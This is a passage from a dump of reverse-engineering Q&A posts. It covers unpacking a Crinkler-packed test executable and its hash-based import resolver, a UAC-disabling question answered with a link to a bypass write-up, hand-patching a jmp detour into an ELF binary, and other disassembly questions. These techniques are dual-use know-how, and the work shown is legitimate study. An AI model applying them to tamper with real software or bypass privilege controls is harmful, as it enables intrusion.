00000140  42 F6 F7 88 0C 1A 94 68 7D 22 BF 3C 30 2F DD C7  Bö÷ˆ..”h}""¿&lt;0/ÝÇ
00000150  6B F9 26 24 83 12 7D A2 3A 05 85 FE B3 D2 B1 CF  kù&amp;$ƒ.}¢:.…þ³Ò±Ï
00000160  0F B2 80 7D 9A 49 1C 61 97 36 9F 22 F6 54 CD 3F  .²€}šI.a—6Ÿ""öTÍ?
00000170  3B 0E 4B 81 F7 A3 6D 3C 54 89 06 C3 37 51 99 E0  ;.K.÷£m&lt;T‰.Ã7Q™à
00000180  E6 1E D8 B1 E4 7C 73 D4 9C 36 78 DA 27 8C 39 F3  æ.Ø±ä|sÔœ6xÚ'Œ9ó
00000190  BD BF 42 6B F3 1C D9 B1 E7 A5 E7 60 1F C6 5B DF  ½¿Bkó.Ù±ç¥ç`.Æ[ß
000001A0  8F A6 47 E0 B5 A7 DD 3D D6 4A CA 91 3C 35 B3 74  .¦Gàµ§Ý=ÖJÊ‘&lt;5³t
000001B0  CB A1 81 90 90 32 39 E4 B0 0F 4D EA E4 EA 2F 0A  Ë¡...29ä°.Mêäê/.
000001C0  6C 06 7C 8F E8 9B B1 50 6E 55 0B                 l.|.è›±PnU.
</code></pre>

<p>linux file utility says it is a ms dos exe </p>

<p>dumpbin complains no COFF header</p>

<pre><code>dumpbin /nologo crinky.exe

Dump of file crinky.exe

File Type: EXECUTABLE IMAGE
LINK : fatal error LNK1235: corrupt or invalid COFF symbol table

file crinky.exe
crinky.exe; MS-DOS executable, MZ for MS-DOS
</code></pre>

<p>loaded it into windbg and looked at header 
appears to be completely corrupt </p>

<pre><code>cdb -c "".foreach /pS 4 /ps 100 (place { lm }) { !dh place };q"" crinky.exe | grep quit: -B 53

File Type: EXECUTABLE IMAGE
FILE HEADER VALUES
     14C machine (i386)
       0 number of sections
7F61DB01 time date stamp Mon Sep 21 09:48:09 2037

7317D010 file pointer to symbol table
F9EB4775 number of symbols
       8 size of optional header
       2 characteristics
            Executable

OPTIONAL HEADER VALUES
     10B magic #
  17.201 linker version
79C08545 size of code
50D3011F size of initialized data
3D90E2F7 size of uninitialized data
      5C address of entry point
C139F3F7 base of code
         ----- new -----
00400000 image base
       4 section alignment
       4 file alignment
       2 subsystem (Windows GUI)
41743.10541 operating system version
16385.36096 image version
 4.52971 subsystem version
 642B6EB size of image
      40 size of headers
BBED3153 checksum
0114be90 size of stack reserve
016a0040 size of stack commit
0000bf58 size of heap reserve
00b10042 size of heap commit
       0  DLL characteristics
       0 [9207725A] address [size] of Export Directory
   4D129 [AD60D029] address [size] of Import Directory
2C74F801 [895A0A6A] address [size] of Resource Directory
54895414 [31AD1024] address [size] of Exception Directory
 1454DED [74FB72C0] address [size] of Security Directory
88AC60AF [6B0732C2] address [size] of Base Relocation Directory
87026FC0 [       0] address [size] of Debug Directory
D2004F48 [F975EF72] address [size] of Description Directory
4200CEBF [E9F5B900] address [size] of Special Directory
 C73031F [ AAB66F3] address [size] of Thread Storage Directory
768D6106 [C3B77B0C] address [size] of Load Configuration Directory
3C8DF1F7 [31E98957] address [size] of Bound Import Directory
 474AEC0 [ 2750700] address [size] of Import Address Table Directory
B60F4141 [E2D30714] address [size] of Delay Import Directory
34845401 [85F37A48] address [size] of COR20 Header Directory
D00D7FDB [ 3751F2C] address [size] of Reserved Directory

quit:
</code></pre>

<p>tested if the entry point function is a function with single exit using cdb 
there were no indirect calls / jmps and it contained only one exit a single return</p>

<pre><code>cdb -c ""g @$exentry;uf @eip;q"" crinky.exe | grep -iE ""call|ret""
004000d3 c3              ret
</code></pre>

<p>so set a bp there and executed and dumped the decryted area</p>

<pre><code>cdb -c ""g 4000d3;t \""dc @eip l38;q\"""" crinky.exe  | grep quit: -B 17

0:000&gt; cdb: Reading initial command 'g 4000d3;t ""dc @eip l38;q""'
*** WARNING: Unable to verify timestamp for image00400000
*** ERROR: Module load completed but symbols could not be loaded for image00400000
00420000  400108bb 00abbe00 00bf0042 58004300  ...@....B....C.X
00420010  8b0c408b 008b0c40 688b008b 75ed8518  .@..@......h...u
00420020  6a006a0e 006a5200 000815ff 31c30043  .j.j.Rj.....C..1
00420030  6091acc0 013c458b 78508be8 4a8bea01  ...`.E&lt;...Px...J
00420040  20428b18 748be801 ee01fc88 c7c1ff31  ..B ...t....1...
00420050  acc03106 7d48c731 e03b3bf5 24428be4  .1..1.H}.;;...B$
00420060  8b66e801 428b480c 8be8011c 44898804  ..f..H.B.......D
00420070  01611c24 c383abe8 56b8e204 000415ff  $.a........V....
00420080  89950043 c8feacf2 c0fefb79 006a8f74  C.......y...t.j.
00420090  4200b868 00c06800 006a0042 000815ff  h..B.h..B.j.....
004200a0  006a0043 000015ff 02cc0043 72657375  C.j.....C...user
004200b0  01003233 000000ff 4e495243 00454c4b  32......CRINKLE.
004200c0  74736554 20676e69 6e697243 0000796b  Testing Crinky..
004200d0  00000000 00000000 00000000 00000000  ................
quit:
</code></pre>

<p>it appears the data has been decrypted but imports are resolved here </p>

<p>any way we can reach our code in three calls </p>

<pre><code>cdb -c ""g 4000d3;rm 0;pct 3""  crinky.exe

0:000&gt; cdb: Reading initial command 'g 4000d3;rm 0;pct 3'
0042007c ff1504004300    call  dword ptr [(00430004)] ={kernel32!LoadLibraryA (7676395c)}
0042007c ff1504004300    call  dword ptr [(00430004)] ={kernel32!LoadLibraryA (7676395c)}
0042009c ff1508004300    call  dword ptr [(00430008)] ={user32!MessageBoxA (75e6ea11)}
0:000&gt; ub @eip
image00400000+0x20086:
00420086 fec8            dec     al
00420088 79fb            jns     image00400000+0x20085 (00420085)
0042008a fec0            inc     al
0042008c 748f            je      image00400000+0x2001d (0042001d)
0042008e 6a00            push    0
00420090 68b8004200      push    offset image00400000+0x200b8 (004200b8)
00420095 68c0004200      push    offset image00400000+0x200c0 (004200c0)
0042009a 6a00            push    0
0:000&gt; da 4200b8
004200b8  ""CRINKLE""
0:000&gt; da 4200c0
004200c0  ""Testing Crinky""
0:000&gt;
</code></pre>

<p>based on these the uncompressed executable may be impossible to dump without serious code ( it doesn't have any import table / nor pe header to work with )</p>

<p>you may have to prepend a pe header and append an import section to the raw memory </p>

<p>as to ollydumpex it is a tool with lots of options </p>

<p>pebase 
you can either select any module , memory range , address range 
list section will list the found section based on the pebase selection 
for example if you choose memory list sections will list the whole virtual address range from 0x10000 to 0x7fffffff (32 bit 2 gb va range )
when you rescan  search pe searches for pe header in the range </p>

<p>dump mode rebuild tries to rebuild the imports if possible (possibly runnable exe)</p>

<p>raw dumps what is in memory (usefull for forensics not fro running the exe) </p>

<p>but you can see ollydumpex complaining corrupt header in status bar 
so dumping with ollydumpex is not a viable option as of now</p>

<p>well you can dump the contents if you start coding a special dumper 
fill the pe headers imports etc it might be serious work maybe </p>

<p>s small start </p>

<pre><code>#define _CRT_SECURE_NO_WARNINGS
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
int dumpdos (char * filepath){
  IMAGE_DOS_HEADER imdos = {0};
  FILE * fp = fopen(filepath,""r"");
  if(fp)  { fseek(fp,0,SEEK_SET);
    fread(&amp;imdos,sizeof(BYTE),sizeof(IMAGE_DOS_HEADER),fp); fclose(fp);
  }
  printf(""%08x\n"",imdos.e_magic);
  printf(""%08x\n"",imdos.e_lfanew);
  return imdos.e_lfanew;
}
void dumpnt (char * filepath , int off_pehead){
  IMAGE_NT_HEADERS imnt = {0};
  FILE * fp = fopen(filepath,""r"");
  if(fp)  { fseek(fp,off_pehead,SEEK_SET);
    fread(&amp;imnt,sizeof(BYTE),sizeof(IMAGE_NT_HEADERS),fp); fclose(fp);
  }
  printf(""%08x\n"",imnt.Signature);
  printf(""%08x\n"",imnt.FileHeader.Machine);
  printf(""%08x\n"",imnt.FileHeader.NumberOfSections);
  printf(""%08x\n"",imnt.FileHeader.SizeOfOptionalHeader);
  printf(""%08x\n"",imnt.OptionalHeader.Magic);
  printf(""%08x\n"",imnt.OptionalHeader.AddressOfEntryPoint); 
  printf(""%08x\n"",imnt.OptionalHeader.ImageBase);
}
void main (int argc,char* argv[]){
  if(argc !=2){     printf(""usage %s &lt;path to binary&gt;"",argv[0] ); exit(-1); }
  printf (""dumping e_magic and e_lfanew from header of %s\n"" , argv[1]);
  int pehead = dumpdos(argv[1]);
  printf(""dumping NtSig , M/c, sect_nos, sizeopt_hdr, opthdrmagic, &amp;EP, imgbase\n"");
  dumpnt(argv[1],pehead);
}
</code></pre>

<p>executing it </p>

<pre><code>dumpcrink.exe ..\crinky.exe

dumping e_magic and e_lfanew from header of ..\crinky.exe
00005a4d
00000004
dumping NtSig , M/c, sect_nos, sizeopt_hdr, opthdrmagic, &amp;EP, imgbase
00004550
0000014c
00000000
00000008
0000010b
0000005c
00400000
</code></pre>

<p>the custom import resolver is cute </p>

<pre><code>CPU Disasm
Address   Command                                  Comments
00420000  MOV     EBX, OFFSET 00400108             ; hashtable
00420005  MOV     ESI, OFFSET 004200AB             ; no of imports to resolve in k32
0042000A  MOV     EDI, OFFSET 00430000             ; destination for resolved imports
0042000F  POP     EAX                              ; peb
00420010  MOV     EAX, DWORD PTR DS:[EAX+0C]       ; Peb.Ldr
00420013  MOV     EAX, DWORD PTR DS:[EAX+0C]       ; inLoadorderModuleList
00420016  MOV     EAX, DWORD PTR DS:[EAX]          ; flink ntdll
00420018  MOV     EAX, DWORD PTR DS:[EAX]          ; flink k32
0042001A  MOV     EBP, DWORD PTR DS:[EAX+18]       ; kernel32.dllbaseAddr
0042001D  TEST    EBP, EBP                         
;  dx ((ntdll!_LDR_DATA_TABLE_ENTRY *)((int )((ntdll!_PEB *) @$peb)-&gt;Ldr-&gt;
;InLoadOrderModuleList.Flink-&gt;Flink-&gt;Flink))-&gt;DllBase
0042001F  JNE     SHORT 0042002F                   ; if this is not k32base exit
00420021  PUSH    0
00420023  PUSH    0
00420025  PUSH    EDX
00420026  PUSH    0
00420028  CALL    NEAR DWORD PTR DS:[430008]       ; will never reach here 
;if reaches here in case of no k32 it will crash with null dereference
0042002E  RETN
0042002F  XOR     EAX, EAX
00420031  LODS    BYTE PTR DS:[ESI]                ; no of imports from k32
00420032  XCHG    EAX, ECX                         ; save no of imports from k32
00420033  PUSHAD
00420034  MOV     EAX, DWORD PTR SS:[EBP+3C]       ; k32peheaderptr (e_lfanew)
00420037  ADD     EAX, EBP                         ; k32peheaderptr PE
00420039  MOV     EDX, DWORD PTR DS:[EAX+78]       ; exporttable of k32
0042003C  ADD     EDX, EBP                         ; k32_imageexportdir
0042003E  MOV     ECX, DWORD PTR DS:[EDX+18]       ; noofname
00420041  MOV     EAX, DWORD PTR DS:[EDX+20]       ; addressofnamerva
00420044  ADD     EAX, EBP                         ; virtualaddrof export names
00420046  MOV     ESI, DWORD PTR DS:[ECX*4+EAX-4]  ; last export rva
0042004A  ADD     ESI, EBP                         ; last export addr name
0042004C  XOR     EDI, EDI                         ; 0
0042004E  ROL     EDI, 6                           ; creating hash
00420051  XOR     EAX, EAX
00420053  LODS    BYTE PTR DS:[ESI]                ; first/nth letter of export name
00420054  XOR     EDI, EAX
00420056  DEC     EAX
00420057  JGE     SHORT 0042004E                   ; null termin seek
00420059  CMP     EDI, DWORD PTR DS:[EBX]          ; comparehash with [400108]
0042005B  LOOPNZ  SHORT 00420041                   ; reloop
0042005D  MOV     EAX, DWORD PTR DS:[EDX+24]       ; matched hash end of iit
00420060  ADD     EAX, EBP
00420062  MOV     CX, WORD PTR DS:[ECX*2+EAX]
00420066  MOV     EAX, DWORD PTR DS:[EDX+1C]       ; addroffunctions
00420069  ADD     EAX, EBP
0042006B  MOV     EAX, DWORD PTR DS:[ECX*4+EAX]
0042006E  MOV     DWORD PTR SS:[ESP+1C], EAX       
; modify register eax so popad will hold the rva of k32 export
00420072  POPAD                                    ; eax stays same as addr of 
;functions
00420073  ADD     EAX, EBP                         ; rva+ base = addr of proc
00420075  STOS    DWORD PTR ES:[EDI]               ; getprocaddr achieved
00420076  ADD     EBX, 4                           ; store at 430000
00420079  LOOP    SHORT 00420033                   
  ; resolves all exports from k32 + loadlibrary
0042007B  PUSH    ESI                              ; ASCII ""user32""
0042007C  CALL    NEAR DWORD PTR DS:[430004]       ; loadlibs user32 or whatever dll
00420082  XCHG    EAX, EBP
00420083  MOV     EDX, ESI                         ; ASCII ""user32""
00420085  LODS    BYTE PTR DS:[ESI]                ; again null term for dll name
00420086  DEC     AL
00420088  JNS     SHORT 00420085
0042008A  INC     AL
0042008C  JE      SHORT 0042001D                   ;
; so this is standard sized custom import resolver
</code></pre>

<p>so i created another exe with more api calls and checked it and<br>
set a hardware exec bp on 42008e and f9nned i landed on actual code   </p>

<pre><code>CPU Disasm
Address   Hex dump               Command                                                  Comments
004000BC    BF 3A014200          MOV     EDI, OFFSET 0042013A &lt;---------
004000C1    B9 23E91F03          MOV     ECX, OFFSET 031FE923
004000C6    73 0C                JAE     SHORT 004000D4
004000C8    F3:66:AB             REP STOS WORD PTR ES:[EDI]
</code></pre>

<p>so 42008e is start of actual code and spans upto the hard coded address<br>
   430000 is resolved imports   </p>

<pre><code>CPU Dump
Address   Hex dump                                         ASCII
0042008E  53 56 8B 35|08 00 43 00|33 DB 57 53|BF E4 00 42| SV‹5 C 3ÛWS¿ä B
0042009E  00 57 68 1C|01 42 00 53|FF D6 53 57|68 0C 01 42|  WhB SÿÖSWhB
004200AE  00 53 FF D6|53 57 68 2C|01 42 00 53|FF D6 53 57|  SÿÖSWh,B SÿÖSW
004200BE  68 FC 00 42|00 53 FF D6|53 57 68 EC|00 42 00 53| hü B SÿÖSWhì B S
004200CE  FF D6 53 FF|15 00 00 43|00 5F 5E 5B|02 75 73 65| ÿÖSÿ  C _^[use
004200DE  72 33 32 00|01 FF 43 52|49 4E 4B 4C|45 00 54 65| r32 ÿCRINKLE Te
004200EE  73 74 69 6E|67 20 43 72|6F 6E 6B 79|00 00 54 65| sting Cronky  Te
004200FE  73 74 69 6E|67 20 43 72|65 6E 6B 79|00 00 54 65| sting Crenky  Te
0042010E  73 74 69 6E|67 20 43 72|61 6E 6B 79|00 00 54 65| sting Cranky  Te
0042011E  73 74 69 6E|67 20 43 72|69 6E 6B 79|00 00 54 65| sting Crinky  Te
0042012E  73 74 69 6E|67 20 43 72|75 6E 6B 79|00 00 00 00| sting Crunky
</code></pre>

<p>if i binary copy and dump it to a bin file i can easily analyze it with ida 
by rebasing it  0x40008e creating an xtern segment a, d  etc </p>

<p>josh wrote a lengthy post below with patching  instructions one doesnt have to go patching instructions all that is needed is hw bp 0x42008e -> f9 _> 
change addr of entry point to 2008e instead of 5c in the original pe header 
create backup and save backup</p>

<p>this mem dump can be loaded as is in idapro and it will be dandy enough like a pristine exe</p>

<pre><code>ollydbg crinkledexe -&gt; ctrl+g 42008e -&gt; right click-&gt; exec hw bpt -&gt; f9 _&gt; patch ADDROF ENTRYPOINT TO 0X2008E INSTEAD OF 0X5C -&gt;right click_&gt; createbackup _&gt; right click _&gt; save backup-&gt; load in ida demo 6.9 bingo it is as nice as it get 
</code></pre>
","13938"
"Can a process disable UAC via WinAPI without prompting the user?","595","","<p>Is it possible for a running process to turn off User Account Control (UAC) via a Windows API call? If so, which API calls are needed?  </p>

<p>I found this <a href=""https://stackoverflow.com/questions/852867/disable-vista-uac-per-application-or-elevate-privileges-without-prompt"">interesting question/answer</a> on stackoverflow, however, I'm interested if there is some other way to do it.</p>
","<p>This seems like a security ex question instead of one about reverse engineering. Therefore I'd keep my answer short.</p>

<p>This <em>should</em> not be possible. Simply as malware would abuse this, what you could do if you want this is find a 0day in kernel space and get SYSTEM privileges. Back in 2010 there was someone from China who has posted a method on the code project(if I recall correctly). It's now hosted on the exploit-db..</p>

<p><a href=""http://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-vista7-mirror/"" rel=""nofollow"">http://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-vista7-mirror/</a></p>

<p>Goodluck on your research.</p>
","3504"
"Disassemble the Decompression method (PowerPC ASM)","595","","<p>Continues from <strong><a href=""https://reverseengineering.stackexchange.com/questions/6527/unknown-game-data-compression-method-gamecube"">Unknown game data compression method (Gamecube)</a><br></strong>
I have compression data which was start with: <strong>[ * SK_ASC* ]</strong> and unknown compression method.<br>The list below compression method that I tested, but doesn't match:</p>

<ul>
<li>LZ10</li>
<li>LZ11</li>
<li>LZ77</li>
<li>LZO1x-1</li>
<li>LZO1x-999</li>
<li>LZSS</li>
<li>LZW</li>
<li>LZMA</li>
<li>HUFF blocksize 4 &amp; 8 byte</li>
<li>RLE</li>
<li>ZLIB</li>
</ul>

<p><strong>Researching for 2 weeks</strong>, I knew that compression algorithms is slightly modified, better than zlib/gzip.<br>
It maybe xored or encrypted so it doesn't match with regular one.<br>
<strong>Finally</strong>, I've found decompression subroutine from main executive file via <strong>IDA Pro</strong>.<br><br>
Subroutine &amp; example uploaded here: <strong><a href=""http://goo.gl/2bQNfj"" rel=""nofollow"">http://goo.gl/2bQNfj</a></strong> <br><strong>(PowerPC Architecture Assembly skill required)</strong><br><br><br>
I have no idea what It mean because I'm not well in PPC disassemble.<br>
Could anyone help found out what the code mean? Could you describe it as C Language or other readable language?</p>

<p><br><br><br>
<strong>P.S. I already posted several forum to help.</strong> </p>

<ul>
<li>http:// zenhax.com/viewtopic.php?f=9&amp;t=313&amp;sid=3172c154c5da95476795ac742501fec1</li>
<li>http:// encode.ru/threads/2074-Identifying-compression-method</li>
</ul>
","<p>You can try to use <a href=""http://decompiler.fit.vutbr.cz/decompilation/"" rel=""nofollow"">retargetable decompiler</a> with your code.</p>
","6640"
"Insert jmp detour into a compiled program","595","","<p>I've seen references on Stack Exchange and elsewhere to inserting detours into compiled code. My understanding is that essentially a jmp instruction is inserted and then somehow the patched program is linked with additional code that contains the target of the jmp.</p>

<p>As a concrete but (hopefully) simple example, consider a program.</p>

<pre><code>#include &lt;stdio.h&gt;

void hello(void) {
    printf(""Hello "");
    printf(""world!\n"");
}

int main(void) {
    hello();
}
</code></pre>

<p>Suppose I have only a binary compiled from this program. No measures have been taken to strip symbols or obfuscate the program in any way. I want to insert a detour to call code compiled from this function.</p>

<pre><code>#include &lt;stdio.h&gt;

void detour(void) {
    printf(""detoured "");
}
</code></pre>

<p>The output of the patched program should be:</p>

<blockquote>
  <p>Hello detoured world!</p>
</blockquote>

<p>How would I do that? How would I avoid breaking address offsets in the compiled code?</p>

<p>My available compilers are gcc, clang, and icc. My available operating systems are OS X and Ubuntu. Choose whatever you prefer in your answer.</p>

<p>If this can't reasonably be answered here then a brief overview and a pointer to some reading material would also be a good answer.</p>

<p>I'm aware of LD_PRELOAD and ld --wrap. The example was chosen so that those methods do not easily suffice. (You could of course just detour the entire hello() function to one that prints ""Hello detoured world!"" but lets pretend you don't have the source code and the function is non-trivial.)</p>

<p><strong>Related Questions</strong></p>

<p>I was first going to ask how to simply disassemble and reassemble a compiled program but that has been asked. The response was that it's extremely difficult. My sense from the answers is that it's not a common thing to do. I suspect my assumption that disassembling and reassembling is a necessary step for detouring might not be correct.</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/3800/why-there-are-not-any-disassemblers-that-can-generate-re-assemblable-asm-code/4133#4133"">Why there are not any disassemblers that can generate re-assemblable asm code?</a></p>

<p>A similar question on StackOverflow received a lukewarm response. This question is focused just on inserting a detour rather than ""modification"" in general and I think the audience here will be more receptive.</p>

<p><a href=""https://stackoverflow.com/questions/4309771/disassembling-modifying-and-then-reassembling-a-linux-executable"">https://stackoverflow.com/questions/4309771/disassembling-modifying-and-then-reassembling-a-linux-executable</a></p>

<p>This Reverse Engineering question asks about modifying binaries in general. A lot of different tools and LD_PRELOAD are mentioned. Some answers say it's possible to do this with a hex editor. I think that's the method I'd be most interested in.</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/185/how-do-i-add-functionality-to-an-existing-binary-executable"">How do I add functionality to an existing binary executable?</a></p>

<p><strong>Recent examples I have seen that refer to doing such a thing</strong></p>

<p>A blog post.</p>

<p><a href=""http://charlessolar.com/post/tag/disassemble"" rel=""nofollow noreferrer"">http://charlessolar.com/post/tag/disassemble</a></p>

<p>This Stack Overflow question.</p>

<p><a href=""https://stackoverflow.com/questions/9449845/how-to-link-object-file-to-executable-compiled-binary"">https://stackoverflow.com/questions/9449845/how-to-link-object-file-to-executable-compiled-binary</a></p>
","<p>I compiled your program on Ubuntu 14.04 and put it on <a href=""https://mega.co.nz/#!gdRRxRzZ!dw08GEHvXeTxXqurcpMLOxpXVjZa807TJN0PH60h4Rg"">https://mega.co.nz/#!gdRRxRzZ!dw08GEHvXeTxXqurcpMLOxpXVjZa807TJN0PH60h4Rg</a>;
you might want to use that binary if you want to retrace the following
steps, because if you don't have the exact version of the C compiler and
libs, your binary might be different.</p>

<p>The file is a zip that includes the original detour.c, the compiled program (detour.orig), and the patched one (detour.patched).</p>

<p>First, let's disassemble the binary using objdump:</p>

<pre><code>$ objdump -d detour.orig|less
.. stuff omitted ..
000000000040057d &lt;hello&gt;:
  40057d:       55                      push   %rbp
  40057e:       48 89 e5                mov    %rsp,%rbp
  400581:       bf 34 06 40 00          mov    $0x400634,%edi
  400586:       b8 00 00 00 00          mov    $0x0,%eax
  40058b:       e8 d0 fe ff ff          callq  400460 &lt;printf@plt&gt;
  400590:       bf 3b 06 40 00          mov    $0x40063b,%edi
  400595:       e8 b6 fe ff ff          callq  400450 &lt;puts@plt&gt;
  40059a:       5d                      pop    %rbp
  40059b:       c3                      retq

000000000040059c &lt;main&gt;:
  40059c:       55                      push   %rbp
  40059d:       48 89 e5                mov    %rsp,%rbp
  4005a0:       e8 d8 ff ff ff          callq  40057d &lt;hello&gt;
  4005a5:       5d                      pop    %rbp
  4005a6:       c3                      retq
  4005a7:       66 0f 1f 84 00 00 00    nopw   0x0(%rax,%rax,1)
  4005ae:       00 00
00000000004005b0 &lt;__libc_csu_init&gt;:
.. more stuff omitted ..
</code></pre>

<p>and also check the data sections:</p>

<pre><code>$ objdump  -s detour.orig | less
.. stuff omitted ..
Contents of section .rodata:
 400630 01000200 48656c6c 6f200077 6f726c64  ....Hello .world
 400640 2100                                 !.
Contents of section .eh_frame_hdr:
.. more stuff omitted ..
</code></pre>

<p>As you see, the strings <code>Hello</code>, <code>world</code> are in the read-only data section, at 400634 and 40063b. These offsets are passed
to <code>printf</code> and <code>puts</code> in <code>hello</code>. Why <code>puts</code>? Well, the optimizer is clever enough to rewrite a printf of a constant string
that ends in '\n' into a puts; you can see the '\n' is omitted from the string in the .rodata section.</p>

<p>Now, we want to insert a <code>puts(""detoured"")</code>. But there's no space in the hello function, and if we tried to insert some bytes
there, everything else in the program would be moved, which we want to avoid. Also, there's no space in the .rodata section
for another string, the .eh_frame_hdr starts directly behind it.</p>

<p>However, check address 4005a7. The main function returns at 4005a6, and the C compiler used some padding to get the next
function,  __libc_csu_init, at a 16-byte boundary. Which means there are a few unused bytes that we can make use of.
Looking through the rest of the disassembly, we find some more bytes like that:</p>

<pre><code>4004ba          66 0f 1f 44 00 00
4004e9          0f 1f 80 00 00 00 00
400529          0f 1f 80 00 00 00 00
4005a7          66 0f 1f 84 00 00 00 00 00
400615          66 66 2e 0f 1f 84 00 00 00 00 00
</code></pre>

<p>The last one of these, 400615, has the size to fit the ""detoured "" string in.</p>

<p>Now what we're going to do with the assembly is patch it to:</p>

<pre><code>400590          jmp 4004e9                              e9 54 ff ff ff
4004e9          mov $0x400615, %edi; jmp 400529         bf 15 06 40 00 eb 39
400529          callq 400460; jmp 4005a7                e8 32 ff ff ff eb 77
4005a7          mov 0x40063b, %edi; jmp 400595          bf eb 06 40 00 eb e7
</code></pre>

<p>which overwrites the instruction at 400590, places the required instructions in the spare bytes, adds jumps between the parts,
and restores the overwritten mov before jumping to the next instruction.</p>

<p>Now, it's time to use a hex editor to apply these patches to the binary (don't forget to move the 'detoured ' string to 400615
as well). The resulting binary should be identical to detour.patched from the zip.</p>

<p>Last, we run the patched program:</p>

<pre><code>$ detour.patched
Hello detoured world!
</code></pre>

<p>As you see, the trick is to make us of unused regions within the program, to avoid moving stuff around, which would break offsets.
I cheated a bit when i put the ""detoured"" string into the code section - this would fail if anything wanted to write-access the string.
If i wanted writable data, i would need to use the data section, and possibly even extend it - but that case is much more
compliated since i'd have to fiddle with the ELF headers and sizes, and i'd probably need specific ELF tools to get it right.
The current example needs nothing but a hex editor. I even crafted the hex coded manually from the opcodes; to get a bit more 
sophisticated, use the radare2 tool.</p>
","6484"
"Identifying protocol in a pcap file?","594","","<p>Is it possible to identify a protocol in a pcap file? I have a file which is a capture of data going between my phone and an IP camera, and I'd like to identify the protocol. I am using the app ""MEye"" to view the camera, which provides no hints of the protocol used.</p>

<p>I have tried googling the headers in some of the packets, but to no avail.</p>

<p>The pcap file can be found <a href=""http://a.pomf.se/vdplhi.pcap"" rel=""nofollow"">here</a>.</p>

<p>Is it possible to identify the protocol at all?</p>
","<blockquote>
  <p>Is it possible to identify a protocol in a pcap file?</p>
</blockquote>

<p>Yes, but this appears to be a proprietary protocol over TCP/IP.</p>

<p>The first four bytes of every message is a 32-bit big-endian value that specifies the length of the following bytes in the message.</p>

<p>The messages aren't encrypted, so you might be able to do some data carving. But if you really want to know what's going on, your best bet is to reverse engineer your ""MEye"" app as opposed to relying solely on the packet capture to understand the protocol.</p>
","6161"
"Load dSYM symbols in Hopper","594","","<p>Can I load dSYM symbols into Hopper? (I searched extensively in the menus etc. but couldn't find such an option)</p>

<p>Context: I want to see how a program I created using Xcode was compiled into machine code using Hopper to view the machine code. My program is stripped during build but I do have its symbols in a <code>.dSYM</code> package.</p>
","<p>It's possible since <a href=""http://hopperapp.tumblr.com/post/76212665426/hopper-disassembler-v3-at-last-its-almost"" rel=""nofollow noreferrer"">Hopper v3</a>, under <code>File &gt; Read Debug Symbols File...</code></p>

<p><img src=""https://i.stack.imgur.com/kQ2vf.png"" alt=""screenshot""></p>
","4677"
"Problem with entry point detection as a file offset","594","","<p>I have found problem with finding file offset which actually is program entry point.</p>

<p>In case I experience problem, value of AddressOfEntryPoint is 0x1018. Here is a section which maps this address.</p>

<p><img src=""https://i.stack.imgur.com/903S0.png"" alt=""Section header""></p>

<p>I assume entry point should be <code>0x28 = 0x10 + 0x1018 - 0x1000 (PointerToRawData + AddressOfEntryPoint - VirtualAddress)</code></p>

<p>However tools says it is 0x18 instead. I'm not sure why, made some experiments and came up with another formula. </p>

<pre><code>0x18 = (0x10 / 0x200) * 0x200 + 0x1018 - 0x1000 ((PointerToRawData / FileAlignment) * FileAlignment + AddressOfEntryPoint - VirtualAddress)
</code></pre>

<p>I use FileAlignment from OptionalHeader and it works great, however I don't know if it is a coincidence or somewhere documented, so asking here for confirmation.</p>

<hr>

<p>Also, probably not important, but file is packed with UPack(0.399), packer signature BE****AD50FF7634EB7C4801.</p>
","<p>From <a href=""https://code.google.com/p/corkami/wiki/PE#PointerToRawData"" rel=""nofollow"">https://code.google.com/p/corkami/wiki/PE#PointerToRawData</a> --</p>

<blockquote>
  <p>if a section's physical start is lower than 200h (the lower limit for
  standard alignment), it is rounded down to 0.</p>
</blockquote>

<p>Thus, the entry point's physical offset would be:
<code>0x00000018 = 0x00000000 + 0x00001018 - 0x00001000</code> (PointerToRawData_rounded_down + AddressOfEntryPoint - VirtualAddress)</p>
","8477"
"Reverse-obfuscated Java code","594","","<p>Any idea how to reverse obfuscated java code !?</p>
","<p>Decompilation is useful for reverse engineering, but in most cases, you won't be able to recompile the results, because compilation and decompilation are lossy processes and obfuscation exacerbates that.</p>

<p>If you understand Java bytecode, a good way to edit JARs is to use a bytecode assembler/disassembler such as <a href=""https://github.com/Storyyeller/Krakatau"" rel=""nofollow noreferrer"">Krakatau</a>. Since this operates directly at the level of compiled bytecode, you can edit any Java classfiles, no matter how obfuscated, and you don't have to worry about compiler errors.</p>
","14548"
"Understanding the loop disassembly","594","","<p>Here is the code of loop that I'm trying to understand the disassembly of it:</p>

<pre><code>#include&lt;stdio.h&gt;
#include &lt;iostream&gt;

using namespace std;

int main() {
   int i, arr[50], num;

   printf(""\nEnter no of elements :"");
   cin &gt;&gt; num;

   //Reading values into Array
   printf(""\nEnter the values :"");
   for (i = 0; i &lt; num; i++)
    cin &gt;&gt; arr[i];

   return 0;
}
</code></pre>

<p>And this is the disassembly:
<img src=""https://i.stack.imgur.com/4JQnv.jpg"" alt=""enter image description here""></p>

<p>Can you explain me the highlighted part? what is <code>Var_D8</code> is used for? Why compiler shifted left the <code>edx</code>?</p>
","<p><code>var_D8</code> is your <code>int arr[50]</code>.</p>

<p>You can recognize it quickly solely by its name : 50 * sizeof(int) = 200 = 0xC8. The next variable on the stack is <code>numb_of_elements</code> which is positionned on -0x10 on the stack, thus we have some memory between -0xD8 and -0x10 that corresponds to the <code>int</code> array.</p>

<p>Here are some explanations about the following instructions :</p>

<pre><code>lea eax, [ebp+var_D8]  ; Get the address of the first element of the array.
mov edx, [ebp+Counter] ; Get the current element index.
shl edx, 2             ; Since the size of each element of the array is 4, multiply the index by 4
add eax, edx           ; &amp;arr[i] = The address of the current element
mov [esp], eax         ; Move it on the stack so it can be written by std::cin
</code></pre>
","9070"
"Use of FastLogHook function in immlib?","592","","<p>I am a newbie in python programming for Debugging . I wrote a code for using the function FastLogHook() in immlib but i am not able to figure out the exact problem with my code as it is not working :(</p>

<p><b> Here is My code </b></p>

<pre><code>#!/usr/bin/env python

import immlib
from immlib import FastLogHook

DESC = ""FastLogHook Basic Demo""

def showresult(imm, a,addr):
if a[0]==addr:
    imm.Log(""(0x%08x &gt;&gt; 0x%08x , 0x%08x)%(a[1][0], a[1][1], a[1][2]) "")
    return ""done""

def main(args):
imm = immlib.Debugger()
Name = 'fasty'
fast = imm.getKnowledge( Name )

